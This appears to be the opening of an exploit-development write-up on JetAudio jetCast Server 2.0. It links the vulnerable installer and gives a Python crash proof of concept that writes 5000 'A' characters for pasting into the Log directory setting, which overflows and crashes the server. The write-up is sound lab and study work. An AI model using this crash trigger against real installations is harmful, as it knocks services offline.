### Vulnerable Application

Exploit developed for JetAudio jetCast Server 2.0. Copy of vulnerable application obtained from ![Exploit-DB](https://www.exploit-db.com/apps/aa8b0ffe339644e7b73da49c72c1fb39-JCS2000.exe)

### Replicating the crash

As an initial step the crash was replicated. This was done to confirm the application is vulnerable and observe the behaviour during the crash. To replicate the crash the basic proof of concept script (https://www.exploit-db.com/exploits/46819) from exploit-db was used.

```python

#Steps to produce the crash:
#1.- Run python code: jetCast_Server_2.0.py
#2.- Open jetCast.txt and copy content to clipboard
#2.- Open jetCast Server
#3.- Select Config
#4.- In "Log directory" Paste ClipBoard
#5.- Click on "Ok"
#6.- Click on "Start"
#7.- Crashed
cod = "\x41" * 5000
f = open('jetCast.txt', 'w')
f.write(cod)
f.close()

```
